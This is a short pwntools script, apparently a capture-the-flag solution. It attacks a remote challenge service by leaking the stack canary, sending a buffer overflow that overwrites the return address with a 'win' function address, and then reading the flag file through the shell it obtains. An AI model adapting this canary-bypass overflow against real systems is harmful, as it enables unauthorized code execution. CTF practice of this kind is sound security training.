from pwn import *

context.arch = 'amd64'
context.log_level = 'info'
WIN = 0x401247

io = remote('chal.thjcc.org', 11038)

io.recvuntil(b'leave a note:\n')
io.sendline(b'A')
io.recvuntil(b'receipt: ')
canary = int(io.recvline(), 16) ^ 0x41
log.success(f'canary = {canary:#018x} -> {p64(canary)}')

io.recvuntil(b'leave another note:\n')
io.sendline(flat(b'A' * 8, canary, 0xdeadbeef, WIN))

io.recvuntil(b'thanks!\n')
io.sendline(b'cat /home/ctf/flag.txt')
io.interactive()
